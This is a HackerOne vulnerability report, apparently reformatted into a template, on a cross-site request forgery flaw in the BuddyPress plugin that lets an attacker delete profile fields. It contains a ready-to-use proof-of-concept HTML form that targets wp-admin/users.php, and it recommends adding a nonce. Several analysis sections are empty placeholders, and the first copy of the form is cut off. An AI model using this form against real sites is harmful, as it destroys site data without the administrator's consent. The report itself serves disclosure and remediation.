# CSRF in Profile Fields allows deleting any field in BuddyPress

## Metadata
- **Source:** HackerOne
- **Report:** 836187 | https://hackerone.com/reports/836187
- **Submitted:** 2020-04-01
- **Reporter:** hoangkien1020
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Cross-Site Request Forgery (CSRF)
- **CVEs:** None
- **Category:** web-api

## Summary
## Description:

CSRF in Profile Fields allows deleting any field in BuddyPress
Version: Latest

## Steps To Reproduce:
Step1: Using a form like so to create the CSRF:
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="[domain]/wp-admin/users.php">
      <input type="hidden" name="page" value="bp&#45;profile&#45;setup" />
      <input type="hidden" name="mode" valu

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

## Description:

CSRF in Profile Fields allows deleting any field in BuddyPress
Version: Latest

## Steps To Reproduce:
Step1: Using a form like so to create the CSRF:
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="[domain]/wp-admin/users.php">
      <input type="hidden" name="page" value="bp&#45;profile&#45;setup" />
      <input type="hidden" name="mode" value="delete&#95;field" />
      <input type="hidden" name="field&#95;id" value="[id_field]" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
Change your [domain] and [id_field]
Step 2: When admin click with step 1 was hidden in images,.... Step1 will allow deleting with [id_field]


## Recommendations
Adding _wpnonce for this function

## Impact

Attacker will this vulnerable to delete profile fileds, break availability and integrity.

</details>

---
*Analysed by Claude on 2026-05-24*
